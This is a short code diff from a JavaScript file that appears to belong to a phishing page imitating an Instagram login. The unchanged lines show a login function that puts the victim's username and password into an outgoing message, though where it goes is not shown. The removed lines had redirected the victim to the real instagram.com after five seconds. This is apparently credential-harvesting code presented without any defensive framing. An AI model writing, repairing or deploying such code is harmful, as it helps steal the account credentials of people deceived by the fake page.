@@ -52,10 +52,6 @@ const login = () => {
       content: `Username : ${username} Password : ${password}`,
     })
   );
-
-  setTimeout(() => {
-    window.open("https://instagram.com");
-  }, 5000);
 };
 
 userInput.addEventListener("input", showUserLabel);
